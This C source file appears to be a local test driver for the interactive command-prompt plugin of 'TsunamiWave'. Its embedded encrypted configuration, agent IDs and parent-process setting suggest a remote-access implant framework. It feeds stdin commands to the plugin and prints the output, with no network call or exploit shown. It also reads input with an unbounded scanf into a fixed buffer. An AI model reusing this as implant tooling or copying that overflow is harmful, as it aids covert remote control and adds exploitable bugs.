#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "EXE_InteractiveCommandPrompt.h"
#include "LIB_InteractiveCommandPrompt.h"

// Primary TsunamiWave Configuration
CHAR g_InteractiveCommandPrompt_szPackedConfiguration[CONFIGURATION_DEFAULT_BUFSIZE] = CONFIGURATION_DEFAULT_MAGIC_NUMBER;
CHAR g_InteractiveCommandPrompt_szPackedConfigurationPassword[] = CONFIGURATION_DEFAULT_PASSWORD;


DWORD wmain(INT argc, LPCWCHAR argv[], LPCWCHAR envp[])
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD dwTempErrorCode = ERROR_SUCCESS;


	LPBYTE	lpPackedConfigurationBuffer = NULL;
	DWORD	dwPackedConfigurationBufferSize = 0;
	LPBYTE	lpPackedConfigurationPasswordBuffer = NULL;
	DWORD	dwPackedConfigurationPasswordBufferSize = 0;
	CHAR*	szConfigurationJson = NULL;
	DWORD	dwConfigurationJsonSize = 0;
	cJSON*	lpJsonInteractiveCommandPromptConfiguration = NULL;

	cJSON*	lpJsonInteractiveCommandPromptInput = NULL;
	cJSON*	lpJsonInteractiveCommandPromptRequestCommandInput = NULL;
	
	CHAR*	szInteractiveCommandPromptInput = NULL;
	DWORD	dwInteractiveCommandPromptInputSize = 0;
	CHAR*	szInteractiveCommandPromptOutput = NULL;
	DWORD	dwInteractiveCommandPromptOutputSize = 0;

	cJSON*	lpJsonInteractiveCommandPromptOutput = NULL;
	cJSON*	lpJsonInteractiveCommandPromptResponseCommandOutput = NULL;

	cJSON*	lpJsonConfiguration = NULL;

	cJSON*	lpJsonBinaryId = NULL;
	cJSON*	lpJsonAgentId = NULL;

	cJSON*	lpJsonInteractiveCommandPromptConfig = NULL;
	cJSON*	lpJsonInteractiveCommandPromptConfigurationParentProcess = NULL;
	cJSON*	lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = NULL;

	DWORD	dwIndex = 0;
		
	CHAR	szCommandLine[MAX_PATH];

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_InteractiveCommandPrompt wmain() start"));

			/***************************************************************************
				Decode/decrypt the configuration JSON string from the binary
			***************************************************************************/
			lpPackedConfigurationBuffer = (LPBYTE)g_InteractiveCommandPrompt_szPackedConfiguration;
			dwPackedConfigurationBufferSize = (DWORD)strlen(g_InteractiveCommandPrompt_szPackedConfiguration);
			lpPackedConfigurationPasswordBuffer = (LPBYTE)g_InteractiveCommandPrompt_szPackedConfigurationPassword;
			dwPackedConfigurationPasswordBufferSize = (DWORD)strlen(g_InteractiveCommandPrompt_szPackedConfigurationPassword);

			DBGPRINT(DEBUG_INFO, TEXT("Get the configuration JSON from the binary storage"));
			dwErrorCode = GetConfigurationFromBinary(
				lpPackedConfigurationBuffer,
				dwPackedConfigurationBufferSize,
				lpPackedConfigurationPasswordBuffer,
				dwPackedConfigurationPasswordBufferSize,
				(LPBYTE*)&szConfigurationJson,
				&dwConfigurationJsonSize
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("DecodeDecryptDecompressBuffer( %p, %d, %p, %d, %p, %p ) failed.(%08x)"),
					lpPackedConfigurationBuffer,
					dwPackedConfigurationBufferSize,
					lpPackedConfigurationPasswordBuffer,
					dwPackedConfigurationPasswordBufferSize,
					(LPBYTE*)&szConfigurationJson,
					&dwConfigurationJsonSize,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwConfigurationJsonSize: %d"), dwConfigurationJsonSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("szConfigurationJson:     %p"), szConfigurationJson);
			//printf("szConfigurationJson:\n%s\n", szConfigurationJson);

			// Parse the output string into a JSON object
			lpJsonConfiguration = cJSON_Parse(szConfigurationJson);
			if (NULL == lpJsonConfiguration)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonConfiguration = cJSON_Parse(%p) failed."),
					szConfigurationJson
				);
				__leave;
			}

			// Get the binary id
			lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_BINARY_ID);
			if (NULL == lpJsonBinaryId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonBinaryId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_BINARY_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonBinaryId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonBinaryId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_BINARY_ID, lpJsonBinaryId->valueint);

			// Get the agent id
			lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, TSM_CONFIGURATION_AGENT_ID);
			if (NULL == lpJsonAgentId)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpJsonAgentId = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					TSM_CONFIGURATION_AGENT_ID
				);
				__leave;
			}
			if (!cJSON_IsNumber(lpJsonAgentId))
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_IsNumber(%p) failed."),
					lpJsonAgentId
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("%S: %d"), TSM_CONFIGURATION_AGENT_ID, lpJsonAgentId->valueint);

			// -------------------------------------------------------------------------
			// Get any other configuration settings
			// -------------------------------------------------------------------------

			// Get the InteractiveCommandPrompt_Configuration from the lpJsonConfiguration
			lpJsonInteractiveCommandPromptConfig = cJSON_GetObjectItemCaseSensitive(lpJsonConfiguration, InteractiveCommandPrompt_Configuration);
			if (NULL == lpJsonInteractiveCommandPromptConfig)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonConfiguration,
					InteractiveCommandPrompt_Configuration
				);
				__leave;
			}

			// Get the InteractiveCommandPrompt_Configuration_ParentProcess from the InteractiveCommandPrompt_Request_Entry
			lpJsonInteractiveCommandPromptConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(lpJsonInteractiveCommandPromptConfig, InteractiveCommandPrompt_Configuration_ParentProcess);
			if (NULL == lpJsonInteractiveCommandPromptConfigurationParentProcess)
			{
				//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInteractiveCommandPromptConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInteractiveCommandPromptConfig,
					InteractiveCommandPrompt_Configuration_ParentProcess
				);
				//__leave;
				DBGPRINT(DEBUG_INFO, TEXT("Using default parent process"));
			}
			else
			{
				if (
					!cJSON_IsString(lpJsonInteractiveCommandPromptConfigurationParentProcess) ||
					(NULL == lpJsonInteractiveCommandPromptConfigurationParentProcess->valuestring)
					)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonInteractiveCommandPromptConfigurationParentProcess
					);
					__leave;
				}
				else
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("Using parent process: %S"), lpJsonInteractiveCommandPromptConfigurationParentProcess->valuestring);
				}
			}
				

			// Get the InteractiveCommandPrompt_Configuration_CommandPromptCommandLine from the InteractiveCommandPrompt_Request_Entry
			lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = cJSON_GetObjectItemCaseSensitive(lpJsonInteractiveCommandPromptConfig, InteractiveCommandPrompt_Configuration_CommandPrompt);
			if (NULL == lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine)
			{
				//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInteractiveCommandPromptConfig,
					InteractiveCommandPrompt_Configuration_CommandPrompt
				);
				//__leave;
				DBGPRINT(DEBUG_INFO, TEXT("Using default command prompt command line"));
			}
			else
			{
				if (
					!cJSON_IsString(lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine) ||
					(NULL == lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine->valuestring)
					)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine
					);
					__leave;
				}
				else
				{
					DBGPRINT(DEBUG_VERBOSE, TEXT("Using command prompt command line: %S"), lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine->valuestring);
				}
			}
				
			
			/***************************************************************************
				Initialize the InteractiveCommandPrompt plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Initialize the InteractiveCommandPrompt plugin"));
			dwErrorCode = InteractiveCommandPromptInitialization(
				(LPBYTE)szConfigurationJson,
				dwConfigurationJsonSize,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("InteractiveCommandPromptInitialization(%p, %d, %p, %p) failed.(%08x)"),
					(LPBYTE)szConfigurationJson,
					dwConfigurationJsonSize,
					NULL,
					NULL,
					dwErrorCode
				);
				__leave;
			}


			/***************************************************************************
				Loop getting a command from this process's input and sending it to the
				InteractiveCommandPrompt for processing
			***************************************************************************/
			do
			{
				
				ZeroMemory(szCommandLine, MAX_PATH);

				// Print the command prompt
				printf("cmd> ");
				// Read the input
				scanf("%[^\n]%*c", szCommandLine);


				/***************************************************************************
					Use the InteractiveCommandPromptCallbackInterface
				***************************************************************************/
				//DBGPRINT(DEBUG_INFO, TEXT("Use the InteractiveCommandPromptCallbackInterface"));

				// Create the input JSON object for the callback
				lpJsonInteractiveCommandPromptInput = cJSON_CreateObject();
				if (NULL == lpJsonInteractiveCommandPromptInput)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonInteractiveCommandPromptInput = cJSON_CreateObject failed.\n")
					);
					__leave;
				}


				// Create the request entry string for the input JSON object
				//DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandLine:  %S"), szCommandLine);
				lpJsonInteractiveCommandPromptRequestCommandInput = cJSON_CreateString(szCommandLine);
				if (NULL == lpJsonInteractiveCommandPromptRequestCommandInput)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonInteractiveCommandPromptRequestCommandInput = cJSON_CreateString(%S) failed."),
						szCommandLine
					);
					__leave;
				}
				cJSON_AddItemToObject(lpJsonInteractiveCommandPromptInput, InteractiveCommandPrompt_Request_CommandInput, lpJsonInteractiveCommandPromptRequestCommandInput);

				// Create the string representation of the TSM_INTERACTIVE_RUN
				szInteractiveCommandPromptInput = cJSON_Print(lpJsonInteractiveCommandPromptInput);
				if (NULL == szInteractiveCommandPromptInput)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("szInteractiveCommandPromptInput = cJSON_Print(%p) failed."),
						szInteractiveCommandPromptInput
					);
					__leave;
				}
				dwInteractiveCommandPromptInputSize = (DWORD)strlen(szInteractiveCommandPromptInput);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwInteractiveCommandPromptInputSize: %d"), dwInteractiveCommandPromptInputSize);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("szInteractiveCommandPromptInput:     %p"), szInteractiveCommandPromptInput);
				//printf("szInteractiveCommandPromptInput: \n%s\n", szInteractiveCommandPromptInput);

				// Call the InteractiveCommandPromptCallbackInterface passing in a NULL JSON input object and receiving the JSON output object
				dwErrorCode = InteractiveCommandPromptCallbackInterface(
					(LPBYTE)szInteractiveCommandPromptInput,
					dwInteractiveCommandPromptInputSize,
					(LPBYTE*)&szInteractiveCommandPromptOutput,
					&dwInteractiveCommandPromptOutputSize
				);
				if (ERROR_SUCCESS != dwErrorCode)
				{
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("InteractiveCommandPromptCallbackInterface(%p, %d, %p, %p) failed.(%08x)"),
						(LPBYTE)szInteractiveCommandPromptInput,
						dwInteractiveCommandPromptInputSize,
						(LPBYTE*)&szInteractiveCommandPromptOutput,
						&dwInteractiveCommandPromptOutputSize,
						dwErrorCode
					);
					__leave;
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwInteractiveCommandPromptOutputSize: %d"), dwInteractiveCommandPromptOutputSize);
				//DBGPRINT(DEBUG_VERBOSE, TEXT("szInteractiveCommandPromptOutput:     %p"), szInteractiveCommandPromptOutput);
				//printf("szInteractiveCommandPromptOutput:\n%s\n", szInteractiveCommandPromptOutput);

				// Parse the output string into a JSON object
				lpJsonInteractiveCommandPromptOutput = cJSON_Parse(szInteractiveCommandPromptOutput);
				if (NULL == lpJsonInteractiveCommandPromptOutput)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonInteractiveCommandPromptOutput = cJSON_Parse(%p) failed."),
						szInteractiveCommandPromptOutput
					);
					__leave;
				}


				// Get the InteractiveCommandPrompt_Response_CommandOutput
				lpJsonInteractiveCommandPromptResponseCommandOutput = cJSON_GetObjectItemCaseSensitive(lpJsonInteractiveCommandPromptOutput, InteractiveCommandPrompt_Response_CommandOutput);
				if (NULL == lpJsonInteractiveCommandPromptResponseCommandOutput)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_ERROR,
						TEXT("lpJsonInteractiveCommandPromptResponseCommandOutput = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
						lpJsonInteractiveCommandPromptOutput,
						InteractiveCommandPrompt_Response_CommandOutput
					);
					__leave;
				}

				if (
					(!cJSON_IsString(lpJsonInteractiveCommandPromptResponseCommandOutput)) ||
					( NULL == lpJsonInteractiveCommandPromptResponseCommandOutput->valuestring )
					)
				{
					dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
							TEXT("cJSON_IsString(%p) failed."),
							lpJsonInteractiveCommandPromptResponseCommandOutput
						);
					__leave;
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("  ->%S: %S"), InteractiveCommandPrompt_Response_CommandOutput, lpJsonInteractiveCommandPromptResponseCommandOutput->valuestring );
				printf("%s\n", lpJsonInteractiveCommandPromptResponseCommandOutput->valuestring);


				// Delete input and output JSON objects
				if (NULL != lpJsonInteractiveCommandPromptInput)
				{
					cJSON_Delete(lpJsonInteractiveCommandPromptInput);
					lpJsonInteractiveCommandPromptInput = NULL;
				}
				if (NULL != lpJsonInteractiveCommandPromptOutput)
				{
					cJSON_Delete(lpJsonInteractiveCommandPromptOutput);
					lpJsonInteractiveCommandPromptOutput = NULL;
				}
				// Free input and output JSON strings
				if (NULL != szInteractiveCommandPromptInput)
				{
					cJSON_free(szInteractiveCommandPromptInput);
					szInteractiveCommandPromptInput = NULL;
				}
				if (NULL != szInteractiveCommandPromptOutput)
				{
					cJSON_free(szInteractiveCommandPromptOutput);
					szInteractiveCommandPromptOutput = NULL;
				}

			} while (0 != strcmp(szCommandLine, "exit"));

		} // end try-finally
		__finally
		{
			// Delete input and output JSON objects
			if (NULL != lpJsonInteractiveCommandPromptInput)
			{
				cJSON_Delete(lpJsonInteractiveCommandPromptInput);
				lpJsonInteractiveCommandPromptInput = NULL;
			}
			if (NULL != lpJsonInteractiveCommandPromptOutput)
			{
				cJSON_Delete(lpJsonInteractiveCommandPromptOutput);
				lpJsonInteractiveCommandPromptOutput = NULL;
			}
			// Free input and output JSON strings
			if (NULL != szInteractiveCommandPromptInput)
			{
				cJSON_free(szInteractiveCommandPromptInput);
				szInteractiveCommandPromptInput = NULL;
			}
			if (NULL != szInteractiveCommandPromptOutput)
			{
				cJSON_free(szInteractiveCommandPromptOutput);
				szInteractiveCommandPromptOutput = NULL;
			}
			// Delete configuration JSON object
			if (NULL != lpJsonConfiguration)
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("cJSON_Delete(%p)"), lpJsonConfiguration);
				cJSON_Delete(lpJsonConfiguration);
				lpJsonConfiguration = NULL;
			}


			/***************************************************************************
				Finalize the InteractiveCommandPrompt plugin
			***************************************************************************/
			DBGPRINT(DEBUG_INFO, TEXT("Finalize the InteractiveCommandPrompt plugin"));
			dwTempErrorCode = InteractiveCommandPromptFinalization(
				NULL,
				NULL,
				NULL,
				NULL
			);
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("InteractiveCommandPromptFinalization( %p, %d, %p, %p ) failed. (%08x)"),
					NULL,
					NULL,
					NULL,
					NULL,
					dwTempErrorCode
				);
				__leave;
			}

			DBGPRINT(DEBUG_VERBOSE, TEXT("EXE_InteractiveCommandPrompt wmain() end"));
		} // end finally
	} // end try-except
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		dwErrorCode = GetExceptionCode();
		DBGPRINT(DEBUG_ERROR, TEXT("Exception occurred. (%08x)"), dwErrorCode);
	} // end except

	return dwErrorCode;
}